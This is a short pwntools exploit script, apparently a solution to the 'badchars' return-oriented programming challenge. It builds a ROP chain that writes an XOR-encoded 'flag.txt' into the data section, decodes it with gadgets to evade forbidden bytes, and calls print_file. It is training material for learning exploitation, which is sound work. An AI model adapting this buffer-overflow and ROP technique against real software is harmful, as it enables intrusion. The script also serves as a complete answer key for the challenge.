from pwn import *

exe = context.binary = ELF("badchars",checksec=False)
context.log_level = 'info'

offset = 40
data_section_address = 0x601030
pop_r12_r13_r14_r15 = 0x40069c
mov_r13_r12 = 0x400634
pop_r14_r15 = 0x4006a0
xor_r15_r14 = 0x400628
pop_rdi = 0x4006a3
print_file = 0x400620

xor_val = 2
xored_string = xor('flag.txt', xor_val)


xor_xploit = b''
data_offset = 0
for c in xored_string:
    xor_xploit += pack(pop_r14_r15)
    xor_xploit += pack(xor_val)
    xor_xploit += pack(data_section_address + data_offset)
    xor_xploit += pack(xor_r15_r14)
    data_offset += 1

payload = flat(
    asm('nop') * offset,
    pop_r12_r13_r14_r15,
    xored_string,
    data_section_address,
    0x0,
    0x0,
    mov_r13_r12,

    xor_xploit,

    pop_rdi,
    data_section_address,
    print_file
)

p = process()
p.clean()
p.sendline(payload)
p.interactive()